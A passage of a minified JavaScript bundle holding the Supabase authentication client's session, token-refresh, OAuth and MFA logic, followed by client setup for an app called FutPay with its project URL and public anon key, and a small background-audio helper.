                    body: Object.assign(Object.assign({}, e), { code_challenge: a, code_challenge_method: l }),
                    jwt: o.access_token,
                    xform: Ut,
                });
                if (d) throw d;
                return (
                    (o.user = c.user),
                    await this._saveSession(o),
                    await this._notifyAllSubscribers("USER_UPDATED", o),
                    { data: { user: o.user }, error: null }
                );
            });
        } catch (r) {
            if (O(r)) return { data: { user: null }, error: r };
            throw r;
        }
    }
    async setSession(e) {
        return await this.initializePromise, await this._acquireLock(-1, async () => await this._setSession(e));
    }
    async _setSession(e) {
        try {
            if (!e.access_token || !e.refresh_token) throw new $t();
            const n = Date.now() / 1e3;
            let r = n,
                s = !0,
                i = null;
            const { payload: o } = Zo(e.access_token);
            if ((o.exp && ((r = o.exp), (s = r <= n)), s)) {
                const { session: a, error: l } = await this._callRefreshToken(e.refresh_token);
                if (l) return { data: { user: null, session: null }, error: l };
                if (!a) return { data: { user: null, session: null }, error: null };
                i = a;
            } else {
                const { data: a, error: l } = await this._getUser(e.access_token);
                if (l) throw l;
                (i = {
                    access_token: e.access_token,
                    refresh_token: e.refresh_token,
                    user: a.user,
                    token_type: "bearer",
                    expires_in: r - n,
                    expires_at: r,
                }),
                    await this._saveSession(i),
                    await this._notifyAllSubscribers("SIGNED_IN", i);
            }
            return { data: { user: i.user, session: i }, error: null };
        } catch (n) {
            if (O(n)) return { data: { session: null, user: null }, error: n };
            throw n;
        }
    }
    async refreshSession(e) {
        return await this.initializePromise, await this._acquireLock(-1, async () => await this._refreshSession(e));
    }
    async _refreshSession(e) {
        try {
            return await this._useSession(async (n) => {
                var r;
                if (!e) {
                    const { data: o, error: a } = n;
                    if (a) throw a;
                    e = (r = o.session) !== null && r !== void 0 ? r : void 0;
                }
                if (!(e != null && e.refresh_token)) throw new $t();
                const { session: s, error: i } = await this._callRefreshToken(e.refresh_token);
                return i
                    ? { data: { user: null, session: null }, error: i }
                    : s
                      ? { data: { user: s.user, session: s }, error: null }
                      : { data: { user: null, session: null }, error: null };
            });
        } catch (n) {
            if (O(n)) return { data: { user: null, session: null }, error: n };
            throw n;
        }
    }
    async _getSessionFromURL(e, n) {
        try {
            if (!Xe()) throw new Ks("No browser detected.");
            if (e.error || e.error_description || e.error_code)
                throw new Ks(e.error_description || "Error in URL with unspecified error_description", {
                    error: e.error || "unspecified_error",
                    code: e.error_code || "unspecified_code",
                });
            switch (n) {
                case "implicit":
                    if (this.flowType === "pkce") throw new qc("Not a valid PKCE flow url.");
                    break;
                case "pkce":
                    if (this.flowType === "implicit") throw new Ks("Not a valid implicit grant flow url.");
                    break;
                default:
            }
            if (n === "pkce") {
                if ((this._debug("#_initialize()", "begin", "is PKCE flow", !0), !e.code))
                    throw new qc("No code detected.");
                const { data: p, error: m } = await this._exchangeCodeForSession(e.code);
                if (m) throw m;
                const w = new URL(window.location.href);
                return (
                    w.searchParams.delete("code"),
                    window.history.replaceState(window.history.state, "", w.toString()),
                    { data: { session: p.session, redirectType: null }, error: null }
                );
            }
            const {
                provider_token: r,
                provider_refresh_token: s,
                access_token: i,
                refresh_token: o,
                expires_in: a,
                expires_at: l,
                token_type: c,
            } = e;
            if (!i || !a || !o || !c) throw new Ks("No session defined in URL");
            const d = Math.round(Date.now() / 1e3),
                h = parseInt(a);
            let f = d + h;
            l && (f = parseInt(l));
            const v = f - d;
            v * 1e3 <= Mn &&
                console.warn(
                    `@supabase/gotrue-js: Session as retrieved from URL expires in ${v}s, should have been closer to ${h}s`
                );
            const y = f - h;
            d - y >= 120
                ? console.warn(
                      "@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",
                      y,
                      f,
                      d
                  )
                : d - y < 0 &&
                  console.warn(
                      "@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clock for skew",
                      y,
                      f,
                      d
                  );
            const { data: _, error: b } = await this._getUser(i);
            if (b) throw b;
            const g = {
                provider_token: r,
                provider_refresh_token: s,
                access_token: i,
                expires_in: h,
                expires_at: f,
                refresh_token: o,
                token_type: c,
                user: _.user,
            };
            return (
                (window.location.hash = ""),
                this._debug("#_getSessionFromURL()", "clearing window.location.hash"),
                { data: { session: g, redirectType: e.type }, error: null }
            );
        } catch (r) {
            if (O(r)) return { data: { session: null, redirectType: null }, error: r };
            throw r;
        }
    }
    _isImplicitGrantCallback(e) {
        return !!(e.access_token || e.error_description);
    }
    async _isPKCECallback(e) {
        const n = await an(this.storage, `${this.storageKey}-code-verifier`);
        return !!(e.code && n);
    }
    async signOut(e = { scope: "global" }) {
        return await this.initializePromise, await this._acquireLock(-1, async () => await this._signOut(e));
    }
    async _signOut({ scope: e } = { scope: "global" }) {
        return await this._useSession(async (n) => {
            var r;
            const { data: s, error: i } = n;
            if (i) return { error: i };
            const o = (r = s.session) === null || r === void 0 ? void 0 : r.access_token;
            if (o) {
                const { error: a } = await this.admin.signOut(o, e);
                if (a && !(vx(a) && (a.status === 404 || a.status === 401 || a.status === 403))) return { error: a };
            }
            return (
                e !== "others" &&
                    (await this._removeSession(), await Ot(this.storage, `${this.storageKey}-code-verifier`)),
                { error: null }
            );
        });
    }
    onAuthStateChange(e) {
        const n = Cx(),
            r = {
                id: n,
                callback: e,
                unsubscribe: () => {
                    this._debug("#unsubscribe()", "state change callback with id removed", n),
                        this.stateChangeEmitters.delete(n);
                },
            };
        return (
            this._debug("#onAuthStateChange()", "registered callback with id", n),
            this.stateChangeEmitters.set(n, r),
            (async () => (
                await this.initializePromise,
                await this._acquireLock(-1, async () => {
                    this._emitInitialSession(n);
                })
            ))(),
            { data: { subscription: r } }
        );
    }
    async _emitInitialSession(e) {
        return await this._useSession(async (n) => {
            var r, s;
            try {
                const {
                    data: { session: i },
                    error: o,
                } = n;
                if (o) throw o;
                await ((r = this.stateChangeEmitters.get(e)) === null || r === void 0
                    ? void 0
                    : r.callback("INITIAL_SESSION", i)),
                    this._debug("INITIAL_SESSION", "callback id", e, "session", i);
            } catch (i) {
                await ((s = this.stateChangeEmitters.get(e)) === null || s === void 0
                    ? void 0
                    : s.callback("INITIAL_SESSION", null)),
                    this._debug("INITIAL_SESSION", "callback id", e, "error", i),
                    console.error(i);
            }
        });
    }
    async resetPasswordForEmail(e, n = {}) {
        let r = null,
            s = null;
        this.flowType === "pkce" && ([r, s] = await $n(this.storage, this.storageKey, !0));
        try {
            return await A(this.fetch, "POST", `${this.url}/recover`, {
                body: {
                    email: e,
                    code_challenge: r,
                    code_challenge_method: s,
                    gotrue_meta_security: { captcha_token: n.captchaToken },
                },
                headers: this.headers,
                redirectTo: n.redirectTo,
            });
        } catch (i) {
            if (O(i)) return { data: null, error: i };
            throw i;
        }
    }
    async getUserIdentities() {
        var e;
        try {
            const { data: n, error: r } = await this.getUser();
            if (r) throw r;
            return { data: { identities: (e = n.user.identities) !== null && e !== void 0 ? e : [] }, error: null };
        } catch (n) {
            if (O(n)) return { data: null, error: n };
            throw n;
        }
    }
    async linkIdentity(e) {
        var n;
        try {
            const { data: r, error: s } = await this._useSession(async (i) => {
                var o, a, l, c, d;
                const { data: h, error: f } = i;
                if (f) throw f;
                const v = await this._getUrlForProvider(`${this.url}/user/identities/authorize`, e.provider, {
                    redirectTo: (o = e.options) === null || o === void 0 ? void 0 : o.redirectTo,
                    scopes: (a = e.options) === null || a === void 0 ? void 0 : a.scopes,
                    queryParams: (l = e.options) === null || l === void 0 ? void 0 : l.queryParams,
                    skipBrowserRedirect: !0,
                });
                return await A(this.fetch, "GET", v, {
                    headers: this.headers,
                    jwt:
                        (d = (c = h.session) === null || c === void 0 ? void 0 : c.access_token) !== null &&
                        d !== void 0
                            ? d
                            : void 0,
                });
            });
            if (s) throw s;
            return (
                Xe() &&
                    !(!((n = e.options) === null || n === void 0) && n.skipBrowserRedirect) &&
                    window.location.assign(r == null ? void 0 : r.url),
                { data: { provider: e.provider, url: r == null ? void 0 : r.url }, error: null }
            );
        } catch (r) {
            if (O(r)) return { data: { provider: e.provider, url: null }, error: r };
            throw r;
        }
    }
    async unlinkIdentity(e) {
        try {
            return await this._useSession(async (n) => {
                var r, s;
                const { data: i, error: o } = n;
                if (o) throw o;
                return await A(this.fetch, "DELETE", `${this.url}/user/identities/${e.identity_id}`, {
                    headers: this.headers,
                    jwt:
                        (s = (r = i.session) === null || r === void 0 ? void 0 : r.access_token) !== null &&
                        s !== void 0
                            ? s
                            : void 0,
                });
            });
        } catch (n) {
            if (O(n)) return { data: null, error: n };
            throw n;
        }
    }
    async _refreshAccessToken(e) {
        const n = `#_refreshAccessToken(${e.substring(0, 5)}...)`;
        this._debug(n, "begin");
        try {
            const r = Date.now();
            return await Ox(
                async (s) => (
                    s > 0 && (await Rx(200 * Math.pow(2, s - 1))),
                    this._debug(n, "refreshing attempt", s),
                    await A(this.fetch, "POST", `${this.url}/token?grant_type=refresh_token`, {
                        body: { refresh_token: e },
                        headers: this.headers,
                        xform: mt,
                    })
                ),
                (s, i) => {
                    const o = 200 * Math.pow(2, s);
                    return i && Yo(i) && Date.now() + o - r < Mn;
                }
            );
        } catch (r) {
            if ((this._debug(n, "error", r), O(r))) return { data: { session: null, user: null }, error: r };
            throw r;
        } finally {
            this._debug(n, "end");
        }
    }
    _isValidSession(e) {
        return typeof e == "object" && e !== null && "access_token" in e && "refresh_token" in e && "expires_at" in e;
    }
    async _handleProviderSignIn(e, n) {
        const r = await this._getUrlForProvider(`${this.url}/authorize`, e, {
            redirectTo: n.redirectTo,
            scopes: n.scopes,
            queryParams: n.queryParams,
        });
        return (
            this._debug("#_handleProviderSignIn()", "provider", e, "options", n, "url", r),
            Xe() && !n.skipBrowserRedirect && window.location.assign(r),
            { data: { provider: e, url: r }, error: null }
        );
    }
    async _recoverAndRefresh() {
        var e, n;
        const r = "#_recoverAndRefresh()";
        this._debug(r, "begin");
        try {
            const s = await an(this.storage, this.storageKey);
            if (s && this.userStorage) {
                let o = await an(this.userStorage, this.storageKey + "-user");
                !this.storage.isServer &&
                    Object.is(this.storage, this.userStorage) &&
                    !o &&
                    ((o = { user: s.user }), await Un(this.userStorage, this.storageKey + "-user", o)),
                    (s.user = (e = o == null ? void 0 : o.user) !== null && e !== void 0 ? e : ea());
            } else if (s && !s.user && !s.user) {
                const o = await an(this.storage, this.storageKey + "-user");
                o && o != null && o.user
                    ? ((s.user = o.user),
                      await Ot(this.storage, this.storageKey + "-user"),
                      await Un(this.storage, this.storageKey, s))
                    : (s.user = ea());
            }
            if ((this._debug(r, "session from storage", s), !this._isValidSession(s))) {
                this._debug(r, "session is not valid"), s !== null && (await this._removeSession());
                return;
            }
            const i = ((n = s.expires_at) !== null && n !== void 0 ? n : 1 / 0) * 1e3 - Date.now() < Xo;
            if ((this._debug(r, `session has${i ? "" : " not"} expired with margin of ${Xo}s`), i)) {
                if (this.autoRefreshToken && s.refresh_token) {
                    const { error: o } = await this._callRefreshToken(s.refresh_token);
                    o &&
                        (console.error(o),
                        Yo(o) ||
                            (this._debug(r, "refresh failed with a non-retryable error, removing the session", o),
                            await this._removeSession()));
                }
            } else if (s.user && s.user.__isUserNotAvailableProxy === !0)
                try {
                    const { data: o, error: a } = await this._getUser(s.access_token);
                    !a && o != null && o.user
                        ? ((s.user = o.user),
                          await this._saveSession(s),
                          await this._notifyAllSubscribers("SIGNED_IN", s))
                        : this._debug(r, "could not get user data, skipping SIGNED_IN notification");
                } catch (o) {
                    console.error("Error getting user data:", o),
                        this._debug(r, "error getting user data, skipping SIGNED_IN notification", o);
                }
            else await this._notifyAllSubscribers("SIGNED_IN", s);
        } catch (s) {
            this._debug(r, "error", s), console.error(s);
            return;
        } finally {
            this._debug(r, "end");
        }
    }
    async _callRefreshToken(e) {
        var n, r;
        if (!e) throw new $t();
        if (this.refreshingDeferred) return this.refreshingDeferred.promise;
        const s = `#_callRefreshToken(${e.substring(0, 5)}...)`;
        this._debug(s, "begin");
        try {
            this.refreshingDeferred = new ao();
            const { data: i, error: o } = await this._refreshAccessToken(e);
            if (o) throw o;
            if (!i.session) throw new $t();
            await this._saveSession(i.session), await this._notifyAllSubscribers("TOKEN_REFRESHED", i.session);
            const a = { session: i.session, error: null };
            return this.refreshingDeferred.resolve(a), a;
        } catch (i) {
            if ((this._debug(s, "error", i), O(i))) {
                const o = { session: null, error: i };
                return (
                    Yo(i) || (await this._removeSession()),
                    (n = this.refreshingDeferred) === null || n === void 0 || n.resolve(o),
                    o
                );
            }
            throw ((r = this.refreshingDeferred) === null || r === void 0 || r.reject(i), i);
        } finally {
            (this.refreshingDeferred = null), this._debug(s, "end");
        }
    }
    async _notifyAllSubscribers(e, n, r = !0) {
        const s = `#_notifyAllSubscribers(${e})`;
        this._debug(s, "begin", n, `broadcast = ${r}`);
        try {
            this.broadcastChannel && r && this.broadcastChannel.postMessage({ event: e, session: n });
            const i = [],
                o = Array.from(this.stateChangeEmitters.values()).map(async (a) => {
                    try {
                        await a.callback(e, n);
                    } catch (l) {
                        i.push(l);
                    }
                });
            if ((await Promise.all(o), i.length > 0)) {
                for (let a = 0; a < i.length; a += 1) console.error(i[a]);
                throw i[0];
            }
        } finally {
            this._debug(s, "end");
        }
    }
    async _saveSession(e) {
        this._debug("#_saveSession()", e), (this.suppressGetSessionWarning = !0);
        const n = Object.assign({}, e),
            r = n.user && n.user.__isUserNotAvailableProxy === !0;
        if (this.userStorage) {
            !r && n.user && (await Un(this.userStorage, this.storageKey + "-user", { user: n.user }));
            const s = Object.assign({}, n);
            delete s.user;
            const i = Xc(s);
            await Un(this.storage, this.storageKey, i);
        } else {
            const s = Xc(n);
            await Un(this.storage, this.storageKey, s);
        }
    }
    async _removeSession() {
        this._debug("#_removeSession()"),
            await Ot(this.storage, this.storageKey),
            await Ot(this.storage, this.storageKey + "-code-verifier"),
            await Ot(this.storage, this.storageKey + "-user"),
            this.userStorage && (await Ot(this.userStorage, this.storageKey + "-user")),
            await this._notifyAllSubscribers("SIGNED_OUT", null);
    }
    _removeVisibilityChangedCallback() {
        this._debug("#_removeVisibilityChangedCallback()");
        const e = this.visibilityChangedCallback;
        this.visibilityChangedCallback = null;
        try {
            e &&
                Xe() &&
                window != null &&
                window.removeEventListener &&
                window.removeEventListener("visibilitychange", e);
        } catch (n) {
            console.error("removing visibilitychange callback failed", n);
        }
    }
    async _startAutoRefresh() {
        await this._stopAutoRefresh(), this._debug("#_startAutoRefresh()");
        const e = setInterval(() => this._autoRefreshTokenTick(), Mn);
        (this.autoRefreshTicker = e),
            e && typeof e == "object" && typeof e.unref == "function"
                ? e.unref()
                : typeof Deno < "u" && typeof Deno.unrefTimer == "function" && Deno.unrefTimer(e),
            setTimeout(async () => {
                await this.initializePromise, await this._autoRefreshTokenTick();
            }, 0);
    }
    async _stopAutoRefresh() {
        this._debug("#_stopAutoRefresh()");
        const e = this.autoRefreshTicker;
        (this.autoRefreshTicker = null), e && clearInterval(e);
    }
    async startAutoRefresh() {
        this._removeVisibilityChangedCallback(), await this._startAutoRefresh();
    }
    async stopAutoRefresh() {
        this._removeVisibilityChangedCallback(), await this._stopAutoRefresh();
    }
    async _autoRefreshTokenTick() {
        this._debug("#_autoRefreshTokenTick()", "begin");
        try {
            await this._acquireLock(0, async () => {
                try {
                    const e = Date.now();
                    try {
                        return await this._useSession(async (n) => {
                            const {
                                data: { session: r },
                            } = n;
                            if (!r || !r.refresh_token || !r.expires_at) {
                                this._debug("#_autoRefreshTokenTick()", "no session");
                                return;
                            }
                            const s = Math.floor((r.expires_at * 1e3 - e) / Mn);
                            this._debug(
                                "#_autoRefreshTokenTick()",
                                `access token expires in ${s} ticks, a tick lasts ${Mn}ms, refresh threshold is ${il} ticks`
                            ),
                                s <= il && (await this._callRefreshToken(r.refresh_token));
                        });
                    } catch (n) {
                        console.error("Auto refresh tick failed with error. This is likely a transient error.", n);
                    }
                } finally {
                    this._debug("#_autoRefreshTokenTick()", "end");
                }
            });
        } catch (e) {
            if (e.isAcquireTimeout || e instanceof tp) this._debug("auto refresh token tick lock not available");
            else throw e;
        }
    }
    async _handleVisibilityChange() {
        if ((this._debug("#_handleVisibilityChange()"), !Xe() || !(window != null && window.addEventListener)))
            return this.autoRefreshToken && this.startAutoRefresh(), !1;
        try {
            (this.visibilityChangedCallback = async () => await this._onVisibilityChanged(!1)),
                window == null || window.addEventListener("visibilitychange", this.visibilityChangedCallback),
                await this._onVisibilityChanged(!0);
        } catch (e) {
            console.error("_handleVisibilityChange", e);
        }
    }
    async _onVisibilityChanged(e) {
        const n = `#_onVisibilityChanged(${e})`;
        this._debug(n, "visibilityState", document.visibilityState),
            document.visibilityState === "visible"
                ? (this.autoRefreshToken && this._startAutoRefresh(),
                  e ||
                      (await this.initializePromise,
                      await this._acquireLock(-1, async () => {
                          if (document.visibilityState !== "visible") {
                              this._debug(
                                  n,
                                  "acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting"
                              );
                              return;
                          }
                          await this._recoverAndRefresh();
                      })))
                : document.visibilityState === "hidden" && this.autoRefreshToken && this._stopAutoRefresh();
    }
    async _getUrlForProvider(e, n, r) {
        const s = [`provider=${encodeURIComponent(n)}`];
        if (
            (r != null && r.redirectTo && s.push(`redirect_to=${encodeURIComponent(r.redirectTo)}`),
            r != null && r.scopes && s.push(`scopes=${encodeURIComponent(r.scopes)}`),
            this.flowType === "pkce")
        ) {
            const [i, o] = await $n(this.storage, this.storageKey),
                a = new URLSearchParams({
                    code_challenge: `${encodeURIComponent(i)}`,
                    code_challenge_method: `${encodeURIComponent(o)}`,
                });
            s.push(a.toString());
        }
        if (r != null && r.queryParams) {
            const i = new URLSearchParams(r.queryParams);
            s.push(i.toString());
        }
        return (
            r != null && r.skipBrowserRedirect && s.push(`skip_http_redirect=${r.skipBrowserRedirect}`),
            `${e}?${s.join("&")}`
        );
    }
    async _unenroll(e) {
        try {
            return await this._useSession(async (n) => {
                var r;
                const { data: s, error: i } = n;
                return i
                    ? { data: null, error: i }
                    : await A(this.fetch, "DELETE", `${this.url}/factors/${e.factorId}`, {
                          headers: this.headers,
                          jwt: (r = s == null ? void 0 : s.session) === null || r === void 0 ? void 0 : r.access_token,
                      });
            });
        } catch (n) {
            if (O(n)) return { data: null, error: n };
            throw n;
        }
    }
    async _enroll(e) {
        try {
            return await this._useSession(async (n) => {
                var r, s;
                const { data: i, error: o } = n;
                if (o) return { data: null, error: o };
                const a = Object.assign(
                        { friendly_name: e.friendlyName, factor_type: e.factorType },
                        e.factorType === "phone" ? { phone: e.phone } : { issuer: e.issuer }
                    ),
                    { data: l, error: c } = await A(this.fetch, "POST", `${this.url}/factors`, {
                        body: a,
                        headers: this.headers,
                        jwt: (r = i == null ? void 0 : i.session) === null || r === void 0 ? void 0 : r.access_token,
                    });
                return c
                    ? { data: null, error: c }
                    : (e.factorType === "totp" &&
                          !((s = l == null ? void 0 : l.totp) === null || s === void 0) &&
                          s.qr_code &&
                          (l.totp.qr_code = `data:image/svg+xml;utf-8,${l.totp.qr_code}`),
                      { data: l, error: null });
            });
        } catch (n) {
            if (O(n)) return { data: null, error: n };
            throw n;
        }
    }
    async _verify(e) {
        return this._acquireLock(-1, async () => {
            try {
                return await this._useSession(async (n) => {
                    var r;
                    const { data: s, error: i } = n;
                    if (i) return { data: null, error: i };
                    const { data: o, error: a } = await A(
                        this.fetch,
                        "POST",
                        `${this.url}/factors/${e.factorId}/verify`,
                        {
                            body: { code: e.code, challenge_id: e.challengeId },
                            headers: this.headers,
                            jwt:
                                (r = s == null ? void 0 : s.session) === null || r === void 0 ? void 0 : r.access_token,
                        }
                    );
                    return a
                        ? { data: null, error: a }
                        : (await this._saveSession(
                              Object.assign({ expires_at: Math.round(Date.now() / 1e3) + o.expires_in }, o)
                          ),
                          await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED", o),
                          { data: o, error: a });
                });
            } catch (n) {
                if (O(n)) return { data: null, error: n };
                throw n;
            }
        });
    }
    async _challenge(e) {
        return this._acquireLock(-1, async () => {
            try {
                return await this._useSession(async (n) => {
                    var r;
                    const { data: s, error: i } = n;
                    return i
                        ? { data: null, error: i }
                        : await A(this.fetch, "POST", `${this.url}/factors/${e.factorId}/challenge`, {
                              body: { channel: e.channel },
                              headers: this.headers,
                              jwt:
                                  (r = s == null ? void 0 : s.session) === null || r === void 0
                                      ? void 0
                                      : r.access_token,
                          });
                });
            } catch (n) {
                if (O(n)) return { data: null, error: n };
                throw n;
            }
        });
    }
    async _challengeAndVerify(e) {
        const { data: n, error: r } = await this._challenge({ factorId: e.factorId });
        return r
            ? { data: null, error: r }
            : await this._verify({ factorId: e.factorId, challengeId: n.id, code: e.code });
    }
    async _listFactors() {
        const {
            data: { user: e },
            error: n,
        } = await this.getUser();
        if (n) return { data: null, error: n };
        const r = (e == null ? void 0 : e.factors) || [],
            s = r.filter((o) => o.factor_type === "totp" && o.status === "verified"),
            i = r.filter((o) => o.factor_type === "phone" && o.status === "verified");
        return { data: { all: r, totp: s, phone: i }, error: null };
    }
    async _getAuthenticatorAssuranceLevel() {
        return this._acquireLock(
            -1,
            async () =>
                await this._useSession(async (e) => {
                    var n, r;
                    const {
                        data: { session: s },
                        error: i,
                    } = e;
                    if (i) return { data: null, error: i };
                    if (!s)
                        return {
                            data: { currentLevel: null, nextLevel: null, currentAuthenticationMethods: [] },
                            error: null,
                        };
                    const { payload: o } = Zo(s.access_token);
                    let a = null;
                    o.aal && (a = o.aal);
                    let l = a;
                    ((r =
                        (n = s.user.factors) === null || n === void 0
                            ? void 0
                            : n.filter((h) => h.status === "verified")) !== null && r !== void 0
                        ? r
                        : []
                    ).length > 0 && (l = "aal2");
                    const d = o.amr || [];
                    return { data: { currentLevel: a, nextLevel: l, currentAuthenticationMethods: d }, error: null };
                })
        );
    }
    async fetchJwk(e, n = { keys: [] }) {
        let r = n.keys.find((a) => a.kid === e);
        if (r) return r;
        const s = Date.now();
        if (((r = this.jwks.keys.find((a) => a.kid === e)), r && this.jwks_cached_at + mx > s)) return r;
        const { data: i, error: o } = await A(this.fetch, "GET", `${this.url}/.well-known/jwks.json`, {
            headers: this.headers,
        });
        if (o) throw o;
        return !i.keys ||
            i.keys.length === 0 ||
            ((this.jwks = i), (this.jwks_cached_at = s), (r = i.keys.find((a) => a.kid === e)), !r)
            ? null
            : r;
    }
    async getClaims(e, n = {}) {
        try {
            let r = e;
            if (!r) {
                const { data: v, error: y } = await this.getSession();
                if (y || !v.session) return { data: null, error: y };
                r = v.session.access_token;
            }
            const {
                header: s,
                payload: i,
                signature: o,
                raw: { header: a, payload: l },
            } = Zo(r);
            (n != null && n.allowExpired) || Dx(i.exp);
            const c =
                !s.alg || s.alg.startsWith("HS") || !s.kid || !("crypto" in globalThis && "subtle" in globalThis.crypto)
                    ? null
                    : await this.fetchJwk(s.kid, n != null && n.keys ? { keys: n.keys } : n == null ? void 0 : n.jwks);
            if (!c) {
                const { error: v } = await this.getUser(r);
                if (v) throw v;
                return { data: { claims: i, header: s, signature: o }, error: null };
            }
            const d = zx(s.alg),
                h = await crypto.subtle.importKey("jwk", c, d, !0, ["verify"]);
            if (!(await crypto.subtle.verify(d, h, o, jx(`${a}.${l}`)))) throw new ll("Invalid JWT signature");
            return { data: { claims: i, header: s, signature: o }, error: null };
        } catch (r) {
            if (O(r)) return { data: null, error: r };
            throw r;
        }
    }
}
ps.nextInstanceID = 0;
const nw = ps;
class rw extends nw {
    constructor(e) {
        super(e);
    }
}
var sw = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
class iw {
    constructor(e, n, r) {
        var s, i, o;
        (this.supabaseUrl = e), (this.supabaseKey = n);
        const a = cx(e);
        if (!n) throw new Error("supabaseKey is required.");
        (this.realtimeUrl = new URL("realtime/v1", a)),
            (this.realtimeUrl.protocol = this.realtimeUrl.protocol.replace("http", "ws")),
            (this.authUrl = new URL("auth/v1", a)),
            (this.storageUrl = new URL("storage/v1", a)),
            (this.functionsUrl = new URL("functions/v1", a));
        const l = `sb-${a.hostname.split(".")[0]}-auth-token`,
            c = { db: ex, realtime: nx, auth: Object.assign(Object.assign({}, tx), { storageKey: l }), global: Zy },
            d = ux(r ?? {}, c);
        (this.storageKey = (s = d.auth.storageKey) !== null && s !== void 0 ? s : ""),
            (this.headers = (i = d.global.headers) !== null && i !== void 0 ? i : {}),
            d.accessToken
                ? ((this.accessToken = d.accessToken),
                  (this.auth = new Proxy(
                      {},
                      {
                          get: (h, f) => {
                              throw new Error(
                                  `@supabase/supabase-js: Supabase Client is configured with the accessToken option, accessing supabase.auth.${String(f)} is not possible`
                              );
                          },
                      }
                  )))
                : (this.auth = this._initSupabaseAuthClient(
                      (o = d.auth) !== null && o !== void 0 ? o : {},
                      this.headers,
                      d.global.fetch
                  )),
            (this.fetch = ox(n, this._getAccessToken.bind(this), d.global.fetch)),
            (this.realtime = this._initRealtimeClient(
                Object.assign({ headers: this.headers, accessToken: this._getAccessToken.bind(this) }, d.realtime)
            )),
            (this.rest = new wy(new URL("rest/v1", a).href, {
                headers: this.headers,
                schema: d.db.schema,
                fetch: this.fetch,
            })),
            (this.storage = new Jy(this.storageUrl.href, this.headers, this.fetch, r == null ? void 0 : r.storage)),
            d.accessToken || this._listenForAuthEvents();
    }
    get functions() {
        return new Yv(this.functionsUrl.href, { headers: this.headers, customFetch: this.fetch });
    }
    from(e) {
        return this.rest.from(e);
    }
    schema(e) {
        return this.rest.schema(e);
    }
    rpc(e, n = {}, r = {}) {
        return this.rest.rpc(e, n, r);
    }
    channel(e, n = { config: {} }) {
        return this.realtime.channel(e, n);
    }
    getChannels() {
        return this.realtime.getChannels();
    }
    removeChannel(e) {
        return this.realtime.removeChannel(e);
    }
    removeAllChannels() {
        return this.realtime.removeAllChannels();
    }
    _getAccessToken() {
        var e, n;
        return sw(this, void 0, void 0, function* () {
            if (this.accessToken) return yield this.accessToken();
            const { data: r } = yield this.auth.getSession();
            return (n = (e = r.session) === null || e === void 0 ? void 0 : e.access_token) !== null && n !== void 0
                ? n
                : this.supabaseKey;
        });
    }
    _initSupabaseAuthClient(
        {
            autoRefreshToken: e,
            persistSession: n,
            detectSessionInUrl: r,
            storage: s,
            userStorage: i,
            storageKey: o,
            flowType: a,
            lock: l,
            debug: c,
        },
        d,
        h
    ) {
        const f = { Authorization: `Bearer ${this.supabaseKey}`, apikey: `${this.supabaseKey}` };
        return new rw({
            url: this.authUrl.href,
            headers: Object.assign(Object.assign({}, f), d),
            storageKey: o,
            autoRefreshToken: e,
            persistSession: n,
            detectSessionInUrl: r,
            storage: s,
            userStorage: i,
            flowType: a,
            lock: l,
            debug: c,
            fetch: h,
            hasCustomAuthorizationHeader: Object.keys(this.headers).some((v) => v.toLowerCase() === "authorization"),
        });
    }
    _initRealtimeClient(e) {
        return new My(
            this.realtimeUrl.href,
            Object.assign(Object.assign({}, e), {
                params: Object.assign({ apikey: this.supabaseKey }, e == null ? void 0 : e.params),
            })
        );
    }
    _listenForAuthEvents() {
        return this.auth.onAuthStateChange((n, r) => {
            this._handleTokenChanged(n, "CLIENT", r == null ? void 0 : r.access_token);
        });
    }
    _handleTokenChanged(e, n, r) {
        (e === "TOKEN_REFRESHED" || e === "SIGNED_IN") && this.changedAccessToken !== r
            ? (this.changedAccessToken = r)
            : e === "SIGNED_OUT" &&
              (this.realtime.setAuth(), n == "STORAGE" && this.auth.signOut(), (this.changedAccessToken = void 0));
    }
}
const ow = (t, e, n) => new iw(t, e, n);
function aw() {
    if (typeof window < "u" || typeof process > "u") return !1;
    const t = process.version;
    if (t == null) return !1;
    const e = t.match(/^v(\d+)\./);
    return e ? parseInt(e[1], 10) <= 18 : !1;
}
aw() &&
    console.warn(
        "⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217"
    );
const li = "https://dpisowtrniryxqrjclgy.supabase.co",
    ui =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwaXNvd3RybmlyeXhxcmpjbGd5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY1MTk4NDksImV4cCI6MjA5MjA5NTg0OX0.qppEmMAentBYpVRzlDrjGa34hqwuc99l7Mh-JN-rvdA",
    ul = !!(li != null && li.trim() && ui != null && ui.trim());
ul ||
    console.warn(
        "[FutPay] Configure na Vercel: VITE_SUPABASE_URL e VITE_SUPABASE_ANON_KEY (Project Settings → Environment Variables)."
    );
const np = ow(
    ul ? li : "https://placeholder.supabase.co",
    ul
        ? ui
        : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBsYWNlaG9sZGVyIiwicm9sZSI6ImFub24iLCJpYXQiOjE5ODY1NDMyMDAsImV4cCI6MTkxNTU1NTU1NX0.placeholder",
    { auth: { persistSession: !1, autoRefreshToken: !1 } }
);
let na = null;
const lw = "/sounds/som-ambiente.mp3",
    uw = 0.16;
let rr = null;
function cw() {
    if (typeof window > "u" || typeof Audio > "u") return null;
    if (!rr) {
        const t = new Audio(lw);
        (t.loop = !0), (t.volume = uw), (t.preload = "auto"), (rr = t);
    }
    return rr;
}
function dw() {
    const t = cw();
    t && t.paused && t.play().catch(() => {});
}
function hw() {
    rr && (rr.pause(), (rr.currentTime = 0));
}
